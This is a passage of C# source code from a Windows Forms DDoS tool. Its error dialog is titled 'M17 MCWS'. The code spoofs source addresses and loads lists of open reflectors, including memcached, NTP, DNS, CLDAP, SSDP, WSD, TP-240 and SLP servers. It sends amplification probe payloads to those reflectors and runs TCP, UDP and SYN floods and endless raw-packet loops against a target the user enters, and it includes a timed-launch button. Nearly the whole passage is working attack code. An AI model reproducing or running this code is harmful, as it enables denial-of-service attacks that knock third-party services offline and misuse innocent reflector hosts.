                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ssdp(ipa, ip, ssdpd, ep, udp, ssdpreflect);
                            }
                            break;
                        case 12:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                src(ipa, ip, sd, ep, udp, sourceservers);
                            }
                            break;
                        case 16:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tos1(ipa, soport, deport, size, size, ttl, textBox9.Text);
                            }
                            break;
                        case 22:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                gmod(ipa, ip, soport, sd, ep, udp, sourceservers);
                            }
                            break;
                        case 23:
                            Random r = new Random();
                            if (custudp.Checked)
                            {
                                ip.PayloadPacket = tcp;
                                tcp.SourcePort = soport;
                                tcp.DestinationPort = deport;
                                byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                tcp.PayloadData = cust;
                                EthernetType et = new EthernetType();
                                switch (comboBox2.SelectedIndex)
                                {
                                    case 0:
                                        et = EthernetType.AppleTalk;
                                        break;
                                    case 1:
                                        et = EthernetType.AppleTalkArp;
                                        break;
                                    case 2:
                                        et = EthernetType.IPv4;
                                        break;
                                    case 3:
                                        et = EthernetType.IPv6;
                                        break;
                                    case 4:
                                        et = EthernetType.Arp;
                                        break;
                                    case 5:
                                        et = EthernetType.None;
                                        break;
                                    case 6:
                                        et = EthernetType.ReverseArp;
                                        break;
                                    case 7:
                                        et = EthernetType.WakeOnLan;
                                        break;
                                    case 8:
                                        et = EthernetType.VLanTaggedFrame;
                                        break;
                                    case 9:
                                        et = EthernetType.NovellIpx;
                                        break;
                                    case 10:
                                        et = EthernetType.MacControl;
                                        break;
                                    case 11:
                                        et = EthernetType.CobraNet;
                                        break;
                                    case 12:
                                        et = EthernetType.MplsUnicast;
                                        break;
                                    case 13:
                                        et = EthernetType.MplsMulticast;
                                        break;
                                    case 14:
                                        et = EthernetType.PppoeDiscoveryStage;
                                        break;
                                    case 15:
                                        et = EthernetType.PppoeSessionStage;
                                        break;
                                    case 16:
                                        et = EthernetType.EapOverLan;
                                        break;
                                    case 17:
                                        et = EthernetType.Profinet;
                                        break;
                                    case 18:
                                        et = EthernetType.HyperScsi;
                                        break;
                                    case 19:
                                        et = EthernetType.AtaOverEthernet;
                                        break;
                                    case 20:
                                        et = EthernetType.EtherCat;
                                        break;
                                    case 21:
                                        et = EthernetType.ProviderBridging;
                                        break;
                                    case 22:
                                        et = EthernetType.Avbtp;
                                        break;
                                    case 23:
                                        et = EthernetType.Lldp;
                                        break;
                                    case 24:
                                        et = EthernetType.SercosIII;
                                        break;
                                    case 25:
                                        et = EthernetType.CecOverEthernet;
                                        break;
                                    case 26:
                                        et = EthernetType.HomePlug;
                                        break;
                                    case 27:
                                        et = EthernetType.Ptp;
                                        break;
                                    case 28:
                                        et = EthernetType.CfmOrOam;
                                        break;
                                    case 29:
                                        et = EthernetType.Fcoe;
                                        break;
                                    case 30:
                                        et = EthernetType.VeritasLlt;
                                        break;
                                    case 31:
                                        et = EthernetType.Echo;
                                        break;
                                    case 32:
                                        et = EthernetType.Novell;
                                        break;
                                    case 33:
                                        et = EthernetType.MacSecurity;
                                        break;
                                }
                                EthernetPacket ep1 = new EthernetPacket(PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                ep1.PayloadPacket = ip;
                                ip.PayloadPacket = udp;
                                while (true)
                                {
                                    if (rip.Checked)
                                    {
                                        ip.SourceAddress = randip();
                                    }
                                    if (rp.Checked)
                                    {
                                        udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                        udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                    }
                                    dev.SendPacket(ep1.Bytes);
                                }
                            }
                            if (custtcp.Checked)
                            {
                                ip.PayloadPacket = tcp;
                                tcp.SourcePort = soport;
                                tcp.DestinationPort = deport;
                                byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                tcp.PayloadData = cust;
                                EthernetType et = new EthernetType();
                                switch (comboBox2.SelectedIndex)
                                {
                                    case 0:
                                        et = EthernetType.AppleTalk;
                                        break;
                                    case 1:
                                        et = EthernetType.AppleTalkArp;
                                        break;
                                    case 2:
                                        et = EthernetType.IPv4;
                                        break;
                                    case 3:
                                        et = EthernetType.IPv6;
                                        break;
                                    case 4:
                                        et = EthernetType.Arp;
                                        break;
                                    case 5:
                                        et = EthernetType.None;
                                        break;
                                    case 6:
                                        et = EthernetType.ReverseArp;
                                        break;
                                    case 7:
                                        et = EthernetType.WakeOnLan;
                                        break;
                                    case 8:
                                        et = EthernetType.VLanTaggedFrame;
                                        break;
                                    case 9:
                                        et = EthernetType.NovellIpx;
                                        break;
                                    case 10:
                                        et = EthernetType.MacControl;
                                        break;
                                    case 11:
                                        et = EthernetType.CobraNet;
                                        break;
                                    case 12:
                                        et = EthernetType.MplsUnicast;
                                        break;
                                    case 13:
                                        et = EthernetType.MplsMulticast;
                                        break;
                                    case 14:
                                        et = EthernetType.PppoeDiscoveryStage;
                                        break;
                                    case 15:
                                        et = EthernetType.PppoeSessionStage;
                                        break;
                                    case 16:
                                        et = EthernetType.EapOverLan;
                                        break;
                                    case 17:
                                        et = EthernetType.Profinet;
                                        break;
                                    case 18:
                                        et = EthernetType.HyperScsi;
                                        break;
                                    case 19:
                                        et = EthernetType.AtaOverEthernet;
                                        break;
                                    case 20:
                                        et = EthernetType.EtherCat;
                                        break;
                                    case 21:
                                        et = EthernetType.ProviderBridging;
                                        break;
                                    case 22:
                                        et = EthernetType.Avbtp;
                                        break;
                                    case 23:
                                        et = EthernetType.Lldp;
                                        break;
                                    case 24:
                                        et = EthernetType.SercosIII;
                                        break;
                                    case 25:
                                        et = EthernetType.CecOverEthernet;
                                        break;
                                    case 26:
                                        et = EthernetType.HomePlug;
                                        break;
                                    case 27:
                                        et = EthernetType.Ptp;
                                        break;
                                    case 28:
                                        et = EthernetType.CfmOrOam;
                                        break;
                                    case 29:
                                        et = EthernetType.Fcoe;
                                        break;
                                    case 30:
                                        et = EthernetType.VeritasLlt;
                                        break;
                                    case 31:
                                        et = EthernetType.Echo;
                                        break;
                                    case 32:
                                        et = EthernetType.Novell;
                                        break;
                                    case 33:
                                        et = EthernetType.MacSecurity;
                                        break;
                                }
                                EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                ep1.PayloadPacket = ip;
                                ip.PayloadPacket = tcp;
                                while (true)
                                {
                                    if (rip.Checked)
                                    {
                                        ip.SourceAddress = randip();
                                    }
                                    if (rp.Checked)
                                    {
                                        udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                        udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                    }
                                    dev.SendPacket(ep1.Bytes);
                                }
                            }
                            break;
                        case 24:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                stuka();
                            }
                            break;
                        case 28:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ud(ipa, ip, soport, deport, f, ep, udp);
                            }
                            break;
                        case 29:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tc(ipa, ip, soport, deport, f, ep, tcp);
                            }
                            break;
                        case 32:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                sf(ipa, ip, soport, deport, f, ep, tcp);
                            }
                            break;
                        case 33:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tclient.Connect(ipe);
                            }
                            break;
                        case 18:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                kasapanos(ipa, ip6, soport, ttl, deport, ep, tcp);
                            }
                            break;
                        case 5:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                slp(ipa, ip, ep, udp, slpservers);
                            }
                            break;
                        case 4:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tp240(ipa, ip, ep, udp, tp240reflect);
                            }
                            break;
                        case 25:
                            a10(ipa, soport, deport, f, ttl);
                            break;
                        case 26:
                            ps24v4(ipa, soport, deport, dnsservers);
                            break;
                    }
                }
                if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    dev.Open();
                    char quot = '"';
                    byte[] ntpd = Encoding.ASCII.GetBytes("\\x17\\x00\\x03\\x2a\\x00\\x00\\x00\\x00");
                    byte[] ssdpd = Encoding.ASCII.GetBytes($"M - SEARCH\\r\\nST: ssdp:all\\r\\nMAN:\\{quot}ssdp:discover{quot}\\n");
                    byte[] memd = Encoding.ASCII.GetBytes("\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n");
                    byte[] dnsd = Encoding.ASCII.GetBytes("\\xff\\xff\\xff\\xff\\x54\\x53\\x6f\\x75\\x72\\x63\\x65\\x20\\x45\\x6e\\x67\\x69\\x6e\\x65\\x20\\x51\\x75\\x65\\x72\\x79\\x00");
                    byte[] sd = Encoding.ASCII.GetBytes("ffffffff54536f7572636520456e67696e6520517565727900");
                    byte[] cldapd = Encoding.ASCII.GetBytes("\\x30\\x25\\x02\\x01\\x01\\x63\\x20\\x04\\x00\\x0a\\x01\\x00\\x0a\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0b\\x6f\\x62\\x6a\\x65\\x63\\x74\\x63\\x6c\\x61\\x73\\x73\\x30\\x00");
                    byte[] wsdd = Encoding.ASCII.GetBytes("<Envelope><Body><Probe></Probe></Body></Envelope>");
                    int sport = int.Parse(sportbox.Text);
                    int dport = int.Parse(dportbox.Text);
                    IPAddress sp = IPAddress.Parse(spoofbox.Text);
                    IPEndPoint ipe = new IPEndPoint(ipa, dport);
                    EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                    IPv6Packet ip6 = new IPv6Packet(sp, ipa);
                    ushort soport = ushort.Parse(sport.ToString());
                    ushort deport = ushort.Parse(dport.ToString());
                    var tcp = new TcpPacket(soport, deport);
                    var udp = new UdpPacket(soport, deport);
                    TcpClient tclient = new TcpClient();
                    int size = int.Parse(sizebox.Text);
                    byte[] f = new byte[int.Parse(sizebox.Text)];
                    ushort ttl = ushort.Parse(ttlbox.Text);
                    string[] ntpservers = System.IO.File.ReadAllLines(@"ntpservers.txt");
                    string[] dnsservers = System.IO.File.ReadAllLines(@"dnsservers.txt");
                    string[] cldapservers = System.IO.File.ReadAllLines(@"cldapservers.txt");
                    string[] memservers = System.IO.File.ReadAllLines(@"memcachedservers.txt");
                    string[] slpservers = System.IO.File.ReadAllLines(@"slpreflectors.txt");
                    string[] sourceservers = System.IO.File.ReadAllLines(@"sourceservers.txt");
                    string[] wreflect = System.IO.File.ReadAllLines(@"wsdreflectors.txt");
                    string[] tp240reflect = System.IO.File.ReadAllLines(@"tp240reflectors.txt");
                    string[] ssdpreflect = System.IO.File.ReadAllLines(@"ssdpreflectors.txt");
                    if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                    {
                        if (comboBox1.SelectedIndex == 13 || comboBox1.SelectedIndex == 14 || comboBox1.SelectedIndex == 15 || comboBox1.SelectedIndex == 16 || comboBox1.SelectedIndex == 17 || comboBox1.SelectedIndex == 18 || comboBox1.SelectedIndex == 21 || comboBox1.SelectedIndex == 25 || comboBox1.SelectedIndex == 28)
                        {
                            ip6.PayloadPacket = tcp;
                            ep.PayloadPacket = ip6;
                        }
                        else if (comboBox1.SelectedIndex == 3 || comboBox1.SelectedIndex == 4 || comboBox1.SelectedIndex == 5 || comboBox1.SelectedIndex == 6 || comboBox1.SelectedIndex == 7 || comboBox1.SelectedIndex == 8 || comboBox1.SelectedIndex == 9 || comboBox1.SelectedIndex == 10 || comboBox1.SelectedIndex == 19 || comboBox1.SelectedIndex == 24)
                        {
                            ip6.PayloadPacket = udp;
                            ep.PayloadPacket = ip6;
                        }
                    }
                    if (comboBox1.SelectedIndex == 19)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            nape(ipa, soport, deport, f, ttl, textBox9.Text);
                        }
                    }
                    if (comboBox1.SelectedIndex == 15)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            ps(ipa, soport, deport, size, size, ttl, textBox9.Text);
                        }
                    }
                    if (comboBox1.SelectedIndex == 17)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            l2023(ipa, soport, deport, size, size, ttl, textBox9.Text);
                        }
                    }
                    if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetwork)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            vx4(dev);
                        }
                    }
                    if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetworkV6)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            vx6(dev);
                        }
                    }
                    switch (comboBox1.SelectedIndex)
                    {
                        case 3:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                mem(ipa, ip6, memd, ep, udp, memservers);
                                ntp(ipa, ip6, memd, ep, udp, ntpservers);
                                wsd(ipa, ip6, memd, ep, udp, wreflect);
                                dns(ipa, ip6, memd, ep, udp, dnsservers);
                                cldap(ipa, ip6, memd, ep, udp, cldapservers);
                                ssdp(ipa, ip6, memd, ep, udp, ssdpreflect);
                                src(ipa, ip6, memd, ep, udp, sourceservers);
                            }
                            break;
                        case 6:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                mem(ipa, ip6, memd, ep, udp, memservers);
                            }
                            break;
                        case 7:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ntp(ipa, ip6, ntpd, ep, udp, ntpservers);
                            }
                            break;
                        case 8:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                wsd(ipa, ip6, wsdd, ep, udp, wreflect);
                            }
                            break;
                        case 9:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                dns(ipa, ip6, dnsd, ep, udp, dnsservers);
                            }
                            break;
                        case 10:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                cldap(ipa, ip6, cldapd, ep, udp, cldapservers);
                            }
                            break;
                        case 11:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ssdp(ipa, ip6, ssdpd, ep, udp, ssdpreflect);
                            }
                            break;
                        case 12:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                src(ipa, ip6, sd, ep, udp, sourceservers);
                            }
                            break;
                        case 16:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tos1(ipa, soport, deport, size, size, ttl, textBox9.Text);
                            }
                            break;
                        case 22:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                gmod(ipa, ip6, soport, sd, ep, udp, sourceservers);
                            }
                            break;
                        case 26:
                            ps24v6(ipa, soport, deport, dnsservers);
                            break;
                        case 23:
                            Random r = new Random();
                            if (custudp.Checked)
                            {
                                ip6.PayloadPacket = tcp;
                                tcp.SourcePort = soport;
                                tcp.DestinationPort = deport;
                                byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                tcp.PayloadData = cust;
                                EthernetType et = new EthernetType();
                                switch (comboBox2.SelectedIndex)
                                {
                                    case 0:
                                        et = EthernetType.AppleTalk;
                                        break;
                                    case 1:
                                        et = EthernetType.AppleTalkArp;
                                        break;
                                    case 2:
                                        et = EthernetType.IPv4;
                                        break;
                                    case 3:
                                        et = EthernetType.IPv6;
                                        break;
                                    case 4:
                                        et = EthernetType.Arp;
                                        break;
                                    case 5:
                                        et = EthernetType.None;
                                        break;
                                    case 6:
                                        et = EthernetType.ReverseArp;
                                        break;
                                    case 7:
                                        et = EthernetType.WakeOnLan;
                                        break;
                                    case 8:
                                        et = EthernetType.VLanTaggedFrame;
                                        break;
                                    case 9:
                                        et = EthernetType.NovellIpx;
                                        break;
                                    case 10:
                                        et = EthernetType.MacControl;
                                        break;
                                    case 11:
                                        et = EthernetType.CobraNet;
                                        break;
                                    case 12:
                                        et = EthernetType.MplsUnicast;
                                        break;
                                    case 13:
                                        et = EthernetType.MplsMulticast;
                                        break;
                                    case 14:
                                        et = EthernetType.PppoeDiscoveryStage;
                                        break;
                                    case 15:
                                        et = EthernetType.PppoeSessionStage;
                                        break;
                                    case 16:
                                        et = EthernetType.EapOverLan;
                                        break;
                                    case 17:
                                        et = EthernetType.Profinet;
                                        break;
                                    case 18:
                                        et = EthernetType.HyperScsi;
                                        break;
                                    case 19:
                                        et = EthernetType.AtaOverEthernet;
                                        break;
                                    case 20:
                                        et = EthernetType.EtherCat;
                                        break;
                                    case 21:
                                        et = EthernetType.ProviderBridging;
                                        break;
                                    case 22:
                                        et = EthernetType.Avbtp;
                                        break;
                                    case 23:
                                        et = EthernetType.Lldp;
                                        break;
                                    case 24:
                                        et = EthernetType.SercosIII;
                                        break;
                                    case 25:
                                        et = EthernetType.CecOverEthernet;
                                        break;
                                    case 26:
                                        et = EthernetType.HomePlug;
                                        break;
                                    case 27:
                                        et = EthernetType.Ptp;
                                        break;
                                    case 28:
                                        et = EthernetType.CfmOrOam;
                                        break;
                                    case 29:
                                        et = EthernetType.Fcoe;
                                        break;
                                    case 30:
                                        et = EthernetType.VeritasLlt;
                                        break;
                                    case 31:
                                        et = EthernetType.Echo;
                                        break;
                                    case 32:
                                        et = EthernetType.Novell;
                                        break;
                                    case 33:
                                        et = EthernetType.MacSecurity;
                                        break;
                                }
                                EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                ep1.PayloadPacket = ip6;
                                ip6.PayloadPacket = udp;
                                while (true)
                                {
                                    if (rip.Checked)
                                    {
                                        ip6.SourceAddress = randip();
                                    }
                                    if (rp.Checked)
                                    {
                                        udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                        udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                    }
                                    dev.SendPacket(ep1.Bytes);
                                }
                            }
                            if (custtcp.Checked)
                            {
                                ip6.PayloadPacket = tcp;
                                tcp.SourcePort = soport;
                                tcp.DestinationPort = deport;
                                byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                tcp.PayloadData = cust;
                                EthernetType et = new EthernetType();
                                switch (comboBox2.SelectedIndex)
                                {
                                    case 0:
                                        et = EthernetType.AppleTalk;
                                        break;
                                    case 1:
                                        et = EthernetType.AppleTalkArp;
                                        break;
                                    case 2:
                                        et = EthernetType.IPv4;
                                        break;
                                    case 3:
                                        et = EthernetType.IPv6;
                                        break;
                                    case 4:
                                        et = EthernetType.Arp;
                                        break;
                                    case 5:
                                        et = EthernetType.None;
                                        break;
                                    case 6:
                                        et = EthernetType.ReverseArp;
                                        break;
                                    case 7:
                                        et = EthernetType.WakeOnLan;
                                        break;
                                    case 8:
                                        et = EthernetType.VLanTaggedFrame;
                                        break;
                                    case 9:
                                        et = EthernetType.NovellIpx;
                                        break;
                                    case 10:
                                        et = EthernetType.MacControl;
                                        break;
                                    case 11:
                                        et = EthernetType.CobraNet;
                                        break;
                                    case 12:
                                        et = EthernetType.MplsUnicast;
                                        break;
                                    case 13:
                                        et = EthernetType.MplsMulticast;
                                        break;
                                    case 14:
                                        et = EthernetType.PppoeDiscoveryStage;
                                        break;
                                    case 15:
                                        et = EthernetType.PppoeSessionStage;
                                        break;
                                    case 16:
                                        et = EthernetType.EapOverLan;
                                        break;
                                    case 17:
                                        et = EthernetType.Profinet;
                                        break;
                                    case 18:
                                        et = EthernetType.HyperScsi;
                                        break;
                                    case 19:
                                        et = EthernetType.AtaOverEthernet;
                                        break;
                                    case 20:
                                        et = EthernetType.EtherCat;
                                        break;
                                    case 21:
                                        et = EthernetType.ProviderBridging;
                                        break;
                                    case 22:
                                        et = EthernetType.Avbtp;
                                        break;
                                    case 23:
                                        et = EthernetType.Lldp;
                                        break;
                                    case 24:
                                        et = EthernetType.SercosIII;
                                        break;
                                    case 25:
                                        et = EthernetType.CecOverEthernet;
                                        break;
                                    case 26:
                                        et = EthernetType.HomePlug;
                                        break;
                                    case 27:
                                        et = EthernetType.Ptp;
                                        break;
                                    case 28:
                                        et = EthernetType.CfmOrOam;
                                        break;
                                    case 29:
                                        et = EthernetType.Fcoe;
                                        break;
                                    case 30:
                                        et = EthernetType.VeritasLlt;
                                        break;
                                    case 31:
                                        et = EthernetType.Echo;
                                        break;
                                    case 32:
                                        et = EthernetType.Novell;
                                        break;
                                    case 33:
                                        et = EthernetType.MacSecurity;
                                        break;
                                }
                                EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                ep1.PayloadPacket = ip6;
                                ip6.PayloadPacket = tcp;
                                while (true)
                                {
                                    if (rip.Checked)
                                    {
                                        ip6.SourceAddress = randip();
                                    }
                                    if (rp.Checked)
                                    {
                                        udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                        udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                    }
                                    dev.SendPacket(ep1.Bytes);
                                }
                            }
                            break;
                        case 24:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                stuka();
                            }
                            break;
                        case 28:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ud(ipa, ip6, soport, deport, f, ep, udp);
                            }
                            break;
                        case 29:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tc(ipa, ip6, soport, deport, f, ep, tcp);
                            }
                            break;
                        case 32:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                sf(ipa, ip6, soport, deport, f, ep, tcp);
                            }
                            break;
                        case 33:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tclient.Connect(ipe);
                            }
                            break;
                        case 19:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                kasapanos(ipa, ip6, soport, ttl, deport, ep, tcp);
                            }
                            break;
                        case 5:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                slp(ipa, ip6, ep, udp, slpservers);
                            }
                            break;
                        case 4:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                tp240(ipa, ip6, ep, udp, tp240reflect);
                            }
                            break;
                        case 25:
                            a10(ipa, soport, deport, f, ttl);
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                System.Windows.Forms.MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void pictureBox2_Click_1(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            DateTime dt = dateTimePicker1.Value;
            if (DateTime.Now == dt)
            {
                try
                {
                    IPAddress ipa = IPAddress.Parse(textBox1.Text);
                    if (ipa.AddressFamily == AddressFamily.InterNetwork)
                    {
                        dev.Open();
                        char quot = '"';
                        byte[] ntpd = Encoding.ASCII.GetBytes(@"\\x17\\x00\\x03\\x2a\\x00\\x00\\x00\\x00");
                        byte[] ssdpd = Encoding.ASCII.GetBytes($@"M - SEARCH\\r\\nST: ssdp:all\\r\\nMAN:\\{quot}ssdp:discover{quot}\\n");
                        byte[] memd = Encoding.ASCII.GetBytes(@"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n");
                        byte[] dnsd = Encoding.ASCII.GetBytes(@"\\xff\\xff\\xff\\xff\\x54\\x53\\x6f\\x75\\x72\\x63\\x65\\x20\\x45\\x6e\\x67\\x69\\x6e\\x65\\x20\\x51\\x75\\x65\\x72\\x79\\x00");
                        byte[] sd = Encoding.ASCII.GetBytes(@"ffffffff54536f7572636520456e67696e6520517565727900");
                        byte[] cldapd = Encoding.ASCII.GetBytes(@"\\x30\\x25\\x02\\x01\\x01\\x63\\x20\\x04\\x00\\x0a\\x01\\x00\\x0a\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0b\\x6f\\x62\\x6a\\x65\\x63\\x74\\x63\\x6c\\x61\\x73\\x73\\x30\\x00");
                        byte[] wsdd = Encoding.ASCII.GetBytes(@"<Envelope><Body><Probe></Probe></Body></Envelope>");
                        int sport = int.Parse(sportbox.Text);
                        int dport = int.Parse(dportbox.Text);
                        IPAddress sp = IPAddress.Parse(spoofbox.Text);
                        IPEndPoint ipe = new IPEndPoint(ipa, dport);
                        EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                        IPv4Packet ip = new IPv4Packet(sp, ipa);
                        IPv6Packet ip6 = new IPv6Packet(sp, ipa);
                        ushort soport = ushort.Parse(sport.ToString());
                        ushort deport = ushort.Parse(dport.ToString());
                        var tcp = new TcpPacket(soport, deport);
                        TcpClient tclient = new TcpClient();
                        var udp = new UdpPacket(soport, deport);
                        int size = int.Parse(sizebox.Text);
                        byte[] f = new byte[int.Parse(sizebox.Text)];
                        ushort ttl = ushort.Parse(ttlbox.Text);
                        string[] ntpservers = System.IO.File.ReadAllLines(@"ntpservers.txt");
                        string[] dnsservers = System.IO.File.ReadAllLines(@"dnsservers.txt");
                        string[] cldapservers = System.IO.File.ReadAllLines(@"cldapservers.txt");
                        string[] memservers = System.IO.File.ReadAllLines(@"memcachedservers.txt");
                        string[] slpservers = System.IO.File.ReadAllLines(@"slpreflectors.txt");
                        string[] sourceservers = System.IO.File.ReadAllLines(@"sourceservers.txt");
                        string[] wreflect = System.IO.File.ReadAllLines(@"wsdreflectors.txt");
                        string[] tp240reflect = System.IO.File.ReadAllLines(@"tp240reflectors.txt");
                        string[] ssdpreflect = System.IO.File.ReadAllLines(@"ssdpreflectors.txt");
                        if (ipa.AddressFamily == AddressFamily.InterNetwork)
                        {
                            if (comboBox1.SelectedIndex == 13 || comboBox1.SelectedIndex == 14 || comboBox1.SelectedIndex == 15 || comboBox1.SelectedIndex == 16 || comboBox1.SelectedIndex == 17 || comboBox1.SelectedIndex == 18 || comboBox1.SelectedIndex == 21 || comboBox1.SelectedIndex == 25 || comboBox1.SelectedIndex == 28)
                            {
                                ip.PayloadPacket = tcp;
                                ep.PayloadPacket = ip;
                            }
                            else if (comboBox1.SelectedIndex == 3 || comboBox1.SelectedIndex == 4 || comboBox1.SelectedIndex == 5 || comboBox1.SelectedIndex == 6 || comboBox1.SelectedIndex == 7 || comboBox1.SelectedIndex == 8 || comboBox1.SelectedIndex == 9 || comboBox1.SelectedIndex == 10 || comboBox1.SelectedIndex == 19 || comboBox1.SelectedIndex == 24)
                            {
                                ip.PayloadPacket = udp;
                                ep.PayloadPacket = ip;
                            }
                        }
                        if (comboBox1.SelectedIndex == 19)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                nape(ipa, soport, deport, f, ttl, textBox9.Text);
                            }
                        }
                        if (comboBox1.SelectedIndex == 15)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ps(ipa, soport, deport, size, size, ttl, textBox9.Text);
                            }
                        }
                        if (comboBox1.SelectedIndex == 17)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                l2023(ipa, soport, deport, size, size, ttl, textBox9.Text);
                            }
                        }
                        if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetwork)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                vx4(dev);
                            }
                        }
                        if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                vx6(dev);
                            }
                        }
                        switch (comboBox1.SelectedIndex)
                        {
                            case 3:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    mem(ipa, ip, memd, ep, udp, memservers);
                                    ntp(ipa, ip, memd, ep, udp, ntpservers);
                                    wsd(ipa, ip, memd, ep, udp, wreflect);
                                    dns(ipa, ip, memd, ep, udp, dnsservers);
                                    cldap(ipa, ip, memd, ep, udp, cldapservers);
                                    ssdp(ipa, ip, memd, ep, udp, ssdpreflect);
                                    src(ipa, ip, memd, ep, udp, sourceservers);
                                }
                                break;
                            case 6:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    mem(ipa, ip, memd, ep, udp, memservers);
                                }
                                break;
                            case 7:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    ntp(ipa, ip, ntpd, ep, udp, ntpservers);
                                }
                                break;
                            case 8:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    wsd(ipa, ip, wsdd, ep, udp, wreflect);
                                }
                                break;
                            case 9:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    dns(ipa, ip, dnsd, ep, udp, dnsservers);
                                }
                                break;
                            case 10:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    cldap(ipa, ip, cldapd, ep, udp, cldapservers);
                                }
                                break;
                            case 11:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    ssdp(ipa, ip, ssdpd, ep, udp, ssdpreflect);
                                }
                                break;
                            case 12:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    src(ipa, ip, sd, ep, udp, sourceservers);
                                }
                                break;
                            case 16:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tos1(ipa, soport, deport, size, size, ttl, textBox9.Text);
                                }
                                break;
                            case 22:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    gmod(ipa, ip, soport, sd, ep, udp, sourceservers);
                                }
                                break;
                            case 23:
                                Random r = new Random();
                                if (custudp.Checked)
                                {
                                    ip.PayloadPacket = tcp;
                                    tcp.SourcePort = soport;
                                    tcp.DestinationPort = deport;
                                    byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                    tcp.PayloadData = cust;
                                    EthernetType et = new EthernetType();
